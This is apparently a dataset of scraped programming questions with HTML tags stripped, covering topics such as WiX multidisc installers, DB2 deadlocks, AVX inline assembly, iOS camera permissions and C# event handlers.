Negative 4804 pFirst time asking a question here, and might not be my last.  This is in regards to WiX 3.8  p  pMy company is starting to go into the installer business, and one of the requirements I have been tasked to do is to create a multidisc installation for our product.  I have used WiX before for simple patches, but now we want to create a full installation.  Some of the requirements includep  ul liCreating external cab files for multiple discs [Which I enabled with setting the EmbedCab property in the media tag to no and setting the disc IDs to each file element with Compression to low]li liThe finished build will have the 5 discs in separate folders, with the respected external cab files in each [Media tag layout set to destination]li liExecuting the .msi file inside the Disc1 folder [Which works...almost]li ul  pThe problem I am running into is that when the .msi file is located on the hard disk, either outside the Disc layouts or inside the Disc1 subfolder, it cannot find the other .cab files.  The requirement I have is that I need to find a way to be able to only prompt for a disc if and only if after searching inside the next subfolder Disc2 and finding the next .cab file to install.  Therefore it can not only look in the root where the .msi is located, but also check the subfolders for the required cab files. This almost mimics InstallShield, but I REALLY dont want to go that route.p  pThe second issue I have is regards to the bootstrapper.  The .exe file needs to embed the .msi file as per the requirement.  However, even when disabling caching of the msi file, the bootstrapper seems to start caching all the other .cab files we are talking about a 20GB installation.  Even disabling repair and rollback, the bootstrapper continues to try to cache the cab files into the PackageCache area on my system.p  pIve looked online and read the WiX books to help find a solution, but I seem to finally hit a dead end.  Can anyone give me any thoughts or insight to help with this issuep  pSome things I have tried so far  Using a custom action C to perform a ResolveSource to try to change the SourceDir property to continue installation  Thought about making a custom bootstrapper to disable the package caching event entirely, but I have no idea where to start.p  pAny advice, direction or even a sample to help would be greatly appreciated.p  pThanksp

Negative 4804 pI write an application that uses the api of iHealth. Scales, blood pressure monitor, and devices like that by iHealth send there data with Bluetooth and smartphone apps to the internet cloud of iHealth. Therefore a user of this devices has a user account in the iHealth internet cloud. There he can login and see his data. My app uses the iHealth api to get the data from this cloud. The user of the devices gives mi the right to access his data by OAuth 2 and after receiving the access data I ask for the data of the user with the given client id.p  pWell, here comes the problem. As a result I get a JSONObject of measuring data without any data. That means there is no error message, everything seems fine, except that there are no data of this user. Its no kind of error documented here sandbox.ihealthlabs.comdevdocumentationResponseFormatAndErrors.htmp  pHttp status is good too 200.p  pI dont use any optional restrictions like asking for data of only certain time.p  pAn explication would be that the user still hasnt used his devices and the cloud therefore doesnt has any data. Unfortunately this is something I cant influence My app is still not ready and therefore I only use the sandbox cloud offered for development a hrefhttpsandbox.ihealthlabs.com relnofollowhttpsandbox.ihealthlabs.coma.p  pThe sandboxuser cant use the smartphone apps and therefore I can only read the data that are yet there in the cloud.

Negative 4804 pI have some working code that currently generates a dynamic list of articles in Joomla. This is part of a quest system I am developing. Each article quest has a custom prerequisite value assigned to it. Ive assigned these values using an extension called Fields Attach which allows you to define custom article attributes and store them in the database. The code below lists all quests with a prereq value of 0 or any quests with a prereq value that matches the article id of a quest in the completed quests table. p  pRight now, when a user submits a quest it stores the article information id, title, etc in the completed quests table. If a quest has a prereq value that matches the id of a quest that has not yet been completed, it will not be displayed. Hopefully that makes sense.p  pSo, my question is this How can I store an array of article ids For instance, if I want a particular quest to have multiple prerequisites, I could assign something like 1, 2, 3 to that quest.

When an error occurs during the insert of an user at the level of accountdetails the account does not get inserted but a record for user does.

The issue that everyday I face horrible deadlock problem, the db hangs for about 5 to 10 minutes then it get back to its normal performance. My services are synchronized in a way which make them never codeSELECTcode or codeUPDATEcode on the same row so I believe even if a deadlock occurred it supposed to be on a row level not table level, RIGHT  Also, in my codeSELECTcode queries I use codeONLY FOR FETCH WITH URcode, in db2 v9.1 that means not to lock the row as its only for read purpose and there will be no update codeURcode  uncommitted read.

However once it is nested in the grid the process of tabbing to the next column is causing the control to loose its value and update the associated binding with a null or the previous value. p  precodelttelerikGridViewDataColumn HeaderValue Date                                      utilitiesGridViewColumnAttachedProperties.UniqueNameBinding ValueDate, SourceStaticResource ColumnNames, ModeOneTimegt                     lttelerikGridViewDataColumn.CellTemplategt                         ltDataTemplategt                             ltTextBlock TextBinding TradingDates.MaturityDateFirstLeg, StringFormat0dd.MM.yyyy, FallbackValue, TargetNullValue gt                         ltDataTemplategt                     lttelerikGridViewDataColumn.CellTemplategt                     lttelerikGridViewDataColumn.CellEditTemplategt                         ltDataTemplategt                             ltlttelerikRadDatePicker SelectedDateBinding Maturity, ModeTwoWay gtgt                             ltdateBoxDropdownDateBoxDropdown StyleStaticResource GridDateDropBoxStyle                                                              Margin12,0,0,0                                                              ItemsSourceBinding TradingDates.DateShortcuts.ShortcutDescriptions                                                              SelectedDateLiteralBinding TradingDates.SelectedDateLiteralFirstLeg, ModeTwoWay, UpdateSourceTriggerPropertyChanged                                                              SelectedDateBinding TradingDates.SelectedDateFirstLeg, ModeTwoWay, UpdateSourceTriggerPropertyChanged                                                              TabNavigationLocal                                                              utilitiesControlFocusHelper.IsFocusedBinding IsFirstLegDateFocused, ModeTwoWay gt                         ltDataTemplategt                     lttelerikGridViewDataColumn.CellEditTemplategt                 lttelerikGridViewDataColumngt codepre  pIt seems that when we use the RadDatePicker control however that this handles tab events quite happilly. I should explain that part of the process for our control is that it takes the value, such as 1w and transforms the value into a valid date entry. As such there is a service call once the value on the binding has been set, however this whole process takes place after the binding has been updated from the UI, as such I believe that once this binding issue is resolved that the rest of the control should behave correctly. p  pDoes anyone know how I might overcome this tab issue, I have been unable to find any good posts or results from searching. p

Negative 4804 pSo I am trying to implement a Six Degrees of Kevin Bacon game. I am doing so by implementing an adjacency matrix.  However, what connects two actors should be a movie, so far all generic implementations assume that you already know how each vertex is connected using boolean values, but none of them demonstrate you would could connect them using the movies.  How would you go around doing sop  pI thought of maybe using a Hashtable to store all the actors with their movies and then building the graph so that each time it adds a new actor it would look at its movies, look at the other actors movies, and match them. However this seem pretty inefficient to me, is there a better way Thanks.p
Negative 4804 pI am not very knowledgeable about system architecture, and have just started learning Python.p  pIn one of the tutorial videos it was mentioned that running sys.maxint in the interpreter will return the biggest integer that is available to you.p  pIt was also mentioned that 2147483647 is the integer that corresponds to a 32 bit system. Thats is the integer that I am being returned when I run sys.maxint.p  pI am using Enthought Canopy 64 bit on a 64 bit OS. Windows 8, to be precise.p  pIs there any way I can increase the sys.maxint value to one that corresponds a 64 bit machinep
Negative 4804 pIn essence, what is the difference between these two classesp  precodeApplicationScoped Singleton class A   Dependent Singleton class B  codepre  h2Contextual EJB instancesh2  pI prefer not to use a hrefhttpdocs.oracle.comjavaee7apijavaxinjectInject.html relnofollowInjecta when looking for EJBs, unless the EJB is a a hrefhttpdocs.oracle.comjavaee7apijavaxejbStateful.html relnofollowStatefula and I want the CDI container to manage the statefuls lifecycle which could be very convenient. Otherwise, using Inject to retrieve a contextual EJB instance is a bit dangerous. For example, a a hrefhttpdocs.oracle.comjavaee7apijavaxejbRemote.html relnofollowRemotea clientview cannot be retrieved using CDI unless we also write a a hrefhttpdocs.oracle.comjavaee7apijavaxenterpriseinjectProduces.html relnofollowproducera. Furthermore, class A and class B can not declare any other scope than what they currently do. a hrefhttpjcp.orgaboutJavacommunityprocessfinaljsr346index.html relnofollowCDI 1.1a, section 3.2 Session beans saysp  blockquote   pA singleton bean must belong to either the ApplicationScoped scope or   to the Dependent pseudoscope. If a session bean specifies an illegal   scope, the container automatically detects the problem and treats it   as a definition error.p blockquote  pHence, apart from stateful beans, I see no point in using CDI when I go look for EJBs.p  h2A more mature version of the questionh2  pFrom the client codes perspective which uses Inject to declare a dependency on either A or B, I cannot imagine there is a difference. In both cases, the call strongwillstrong be routed to a singleton EJB. Had I been the implementation author of a CDI provider, then I might even inject the real EJB proxy in both cases and ignore future calls asking for destruction of the dependent CDI proxy The bottom line is that we may declare two different scopes on the EJB singleton class. So whats the differencep

Negative 4804 pI have a UICollectionView where I overrode hitTestwithEvent in my UICollectionViewCells in order to allow for taps just outside of the cells to register as taps on the cells.p  pWhen I do this and I tap just outside the cells that now register as hits, I get calls to didHighlightItemAtIndexPath and didUnhighlightItemAtIndexPath, but I dont get a call to didSelectItemAtIndexPath. If I tap inside the cell I get all of the expected highlight and select item calls as I did before.p  pI dont have any custom gesture recognizers set up and I dont override touchesBegan or anything like that.p  pSo does anyone know under what conditions you get a call for didHighlightItemAtIndexPath without a call to didSelectItemAtIndexPath Is there any way to get my didSelectItemAtIndexPath called Thanks.p  pstrongEDITstrongp  pI forgot to mention that my UICollectionView is within a Today Widget, so it is contained within the Notification Center scroll view. If I move my select code into the didUnhighlightItemAtIndexPath, then it is called when you tap outside the cell, but the result is that you cant actually scroll the Notification Center without selecting one of the cells.p  pSo perhaps the difference between the highlighting and selecting that Im experiencing here has something to do with the scroll view responder canceling the selection outside of the cellp

Negative 4804 pIm trying to work around an apparent bug in the clang compiler where using the AVX intrinsic mm256loadups results in unnecessary instructions being output in assembly. In particular, first it does a vmovups on the first half of the input vector into an xmm register, then joins the second half with the first using a vinsertf128 instruction, slowing down the program a bit. I would instead expect a single vmovups instruction to a compiler allocated ymm register.p  pIm always been comfortable with SSEAVX intrinsics, but as soon as I need to drop down to inline assembly Im lost.p  pId like an inline function that does the same as the following, but the vmovups should be in inline assembly.p  precodeinline mm256 V8fLoadUconst float pf      return mm256loadupspf  codepre  pHeres what Ive tried so far, but it doesnt work seems to move pf single float onto the stack, then it loads that spacep  precodeinline mm256 V8fLoadUconst float pf      m256 m     asmvmovups 1, 0  x m  xm pf     return m  codepre  pThanks in advance.p

Negative 4804 pI use delphi TTouchKeyboard component for typing on windows. The keyboard switches between different layouts for different languages on its own. Now I would like to use different input languages in different processes. Therefore I check the process for its language when it is focused and change the keyboard layout if it doesnt fit.  That works well with most of the languages, but for the Arabian language and maybe some others, too, the layout wont adopt.  The keyboard then shows another layout the one of the process which was focused before, but in the destination process Arabian letters are typed. Has anyone an explanation for this and can tell me how to make the keyboard language always fit the process languagep  pBelow is the procedure which makes the keyboard layout fit the process layoutp  precodeprocedure TForm1.ApplyToCurrentProcessLanguage var Layout Hkl MyHandle THandle begin   MyHandle  GetForegroundWindow   Layout  GetKeyboardLayoutGetWindowThreadProcessIdMyHandle div 65536   ActivateKeyboardLayoutLayout, 0 end codepre
Negative 4804 pI have a few arrays that I need to hold in memory for the duration of my program. The arrays are used as look up references by different files so I thought I should make a DLL to hold them in.p  pThe main problem I seem to run into is that the files have to be constructed at the beginning of the program. The arrays hold a few thousand values each and future ones may hold millions, so hard coding the arrays isnt an option.p  pHere is my best attemptp  pFirst, I made the Dll header file.

Negative 4804 h3Backgroundh3  pI am currently working on a project for which I have written a DLL as an interface between a Windows driver and MATLAB. All of this is working very well, but one thing up until recently it has been lacking is documentation for certain functionality  essentially it allows command strings to be sent to an FPGA, and all of these commands need documenting. p  pThis could be done using a PDF etc. but I wanted also a way to integrate it the documentation into the DLL itself  so functions like lookup command etc. can be used. At any rate I went ahead and implemented this in a way which I am mostly satisfied. p  pEssentially I have a structure see below to which a pointer can be returned from functions so that the documentation can be accessed. The caller provides the address of a pointer to one of these which is then updated with the address of an entry in a constant global array.p  precodetypedef struct      CONST CHAR  commandString     ULONG commandStringLen     CONST CHAR  documentationString     ULONG documentationStringLen     CONST CHAR  commandParameters     ULONG commandParametersLen  COMMANDDOCS  define STRINGLENa a,sizeofa1 define NEWGROUP  n     define NEWENTRY  n               define NEWLINE   n define ENDTITLE  nn  CONST COMMANDDOCS CommandDocs[]    define COMMANDxyzGROUPINDEXSTART      0          STRINGLENABCD,            STRINGLENSomething Command                      ENDTITLELow Queue                      NEWLINE Description                      NEWGROUPThe ..........                      NEWLINE,            STRINGLENNEWGROUPType x                      NEWENTRYNo Payload                      NEWLINE         , define COMMANDxyzGROUPLENGTH           1      ... And so on  codepre  pThis results in a load of constant strings being stored in memory and an array of documentation structures which contain pointers to these constants and their lengths as well for good measure. A pointer to the required element in the array is returned as I say. The caller of the library API is then free to make copies if needed or display the strings, whatever.p  pThis is all working nicely at the moment, except for a minor annoyance. Whenever I need to update the documentation, it required me to recompile the DLL  as clearly all of the strings are compiled into it. For me that is not an issue as I can easily compile it, but as I am working at a university developing a research platform for them to use, I want it to be as simple for people to update in the future as I move on to other work. Ideally if documentation needs updating  say new commands get added to the system, I would like the additions to be possible without having to do a recompile.p  hr  h3Questionh3  pSo my question really is about what the best way to go about doing this is.p  pAt the moment I am thinking along the lines of loading the documentation from a file, either at the time of loading the DLL, or when the search function is called. Currently there are defines in the array to separate indexes identify groups of commands, but these could be replaced by variables that are initialised by data from the file.p  pI could go for something like XML and parse that to fill up the structures, but part of me thinks it would be easier to understand in the outside world if it was something simpler, but then I suppose I would still need some way of identifying the boundaries between entries, etc.p  pThoughtsp  hr  pNote that the DLL is mostly C  all of the APIs are C interfaces, but internally it is C as Ive been using classes for other parts. I dont mind which is used as long as it is compatible with C interfaces.p

Computation time is more important than memory in this problem and preprocessing time is not important so I would be willing, for instance, to construct a new dataframe that has the size of the Cartesian product n2 the original dataframe but anything more than that might become unreasonablep

Negative 4804 pWe have a windows service that runs a quartz job every minute to process reviews that were submitted more than 3 hours ago. The application uses the latest ServiceStack.Redis v3 library to interface with a Redis 2.8.12 instance on another machine. p  pWhen a new review is submitted, the ID of the new review is stored in a sorted set in Redis and we are using emNewReview.DateCreated.Ticksem for the score.

Negative 4804 pWeve all been there. You want to take photos within your app, or access photos, microphone, contacts, etc... But first iOS must prompt the user for permission. In many cases the user will deny access. p  pIf your app detects that the user has denied access, you can navigate the user to the Apps privacy settings with thisp  precode[[UIApplication sharedApplication] openURL[NSURL URLWithStringUIApplicationOpenSettingsURLString]] codepre  pHandy. However....p  pIve noticed that if you do convince the user to toggle the switch to on, that the app does not detect the changes. p  pConsider this code. The user is immediately prompted for permission to access the camera this only shows the first time that app is run. Suppose the user denied permission. Next they decide that they did want to enable camera access after all. No problem. The user taps on the button which brings up the privacy panel. The user changes the switch to allow access. Then the user switches back to the app. The block fires for UIApplicationDidBecomeActiveNotification which reads the permission again. However it does not reflect the users changes still reads as Denied. p  pIf the app is purged from memory and run again, it will properly read the state. p  pNot all permissions behave this way. For instance CoreLocation seems to detect the users changes. Ive also found a way to detect changes for Notifications. But for Contacts, Calendars, Camera, Microphone, Core Motion and more the changes are not detected until the app is terminated and run again. p  pAny ideasp  precodeimport ViewController.h import AVFoundation  interface ViewController   end  implementation ViewController   voidviewDidLoad      [super viewDidLoad]      [[NSNotificationCenter defaultCenter] addObserverForNameUIApplicationDidBecomeActiveNotification objectnil queue[NSOperationQueue mainQueue] usingBlockNSNotification note          [self printPermission]     ]      [AVCaptureDevice requestAccessForMediaTypeAVMediaTypeVideo completionHandlerBOOL granted          [self printPermission]     ]     voidprintPermission     dispatchasyncdispatchgetmainqueue,          AVAuthorizationStatus status  [AVCaptureDevice authorizationStatusForMediaTypeAVMediaTypeVideo]         ifstatus  AVAuthorizationStatusNotDetermined             NSLogVWWPermissionStatusNotDetermined             self.view.backgroundColor  [UIColor whiteColor]          else ifstatus  AVAuthorizationStatusAuthorized             NSLogVWWPermissionStatusAuthorized             self.view.backgroundColor  [UIColor greenColor]          else ifstatus  AVAuthorizationStatusDenied              NSLogVWWPermissionStatusDenied             self.view.backgroundColor  [UIColor redColor]          else ifstatus  AVAuthorizationStatusRestricted              NSLogVWWPermissionStatusRestricted             self.view.backgroundColor  [UIColor redColor]                  IBActionbuttonActionidsender      [[UIApplication sharedApplication] openURL[NSURL URLWithStringUIApplicationOpenSettingsURLString]]   end codepre

Negative 4804 pthis is my first question on stackoverflow, therefore errors in askingstyle arent on purpose.p  pIm both, new to C as to the concept of eventhandling, so I would like to know, if there is any possibility to have the value of an ToolStripButtonItemattribute changed by an EventHandler. p  pThe context is the followingp  pThe code starts by initializing the UI which contains some Windows.Forms Elements.  The codeToolStripButtomItemcode that is of interest for me, has its codeEnabledattributecode set to false as defaultvalue. The functionality of this button is to switch into a comparisionview as soon as a certain reference file exists. This allready can be the case when the programmstart, otherwise the reference file might be created during runtime. Of course, you could perform p  precodeButton.EnabledSystem.IO.File.ExistsReferenceFile  codepre  pwith the initilization and than do something like p  precodeCreateFileReferenceFile     ...     Button.Enabled  true  codepre  pbut this seems rather crude to me.p  pInstead I would like to something likep  precodeButton.Enabled  new System.EventHandlerthis.EnableButton codepre  pwithp  precodeprivate void EnableButtonObject sender, EventArgs e   ifSystem.IO.FileExistsReferenceFile   Button.Enabled  true     codepre  pWhat I intend is, to have the button get enabled as soon as the referencefile existst. There are multiple ways to create the referencefile, and there are goint to be even more in the future. To avoid setting the enablevalue in each of those codecreateReferenceFilecodeMethods, the concept of EventHandling seems quite like the deal to me.p  pThe program Im trying to run is quite comprehensive, so polling is no option at this place.p

Im going to put the El Capitan public beta on my external hard drive and see if xcode 7 will run on that. Though, is there anyway I can get Xcode 7 Beta 3 to run on Yosemite 10.10.3 I have a mid2009 MacBook Pro, 2.66GHz Intel Core 2 Duo, 4 GB RAM, 256GB SSD.p

Negative 4804 pI am new to iOS development and I am working on a weather app that makes a series of requests that all rely on the previous and can all potentially fail.  Basically, when the user opens the app or refreshes it, I want the following to happenp  ol lipCheck that the user has authorized the app to use their location and that they have enabled location services on their device.pli lipUse their location to make a call to a weather service.pli lipUse the data returned by the weather service to make an http request to another service to grab related data.pli lipUse the data I get back to refresh the UI.pli ol  pI only want to update the UI when I have ALL the data I need, even though I could update it bit by bit as things are returned to me. Furthermore, if any step fails, I want to stop the update entirely and notify the user.p  pAs Ive been trying to implement this, Ive been having a hard time keeping it clean.  My code is jumping all over the place from ViewController to my CLLocationManagerDelegate back to my ViewController then to another class, etc. and Im passing around a lot of closures which is becoming confusing to follow.  p  pI can get it all to work, but when I come back to make updates in the future, I dont want to be confused looking at my code.  Are there any common design patternsprinciples out there that are used for this sort of situation  Any suggestions to make this clean would be much appreciatedp
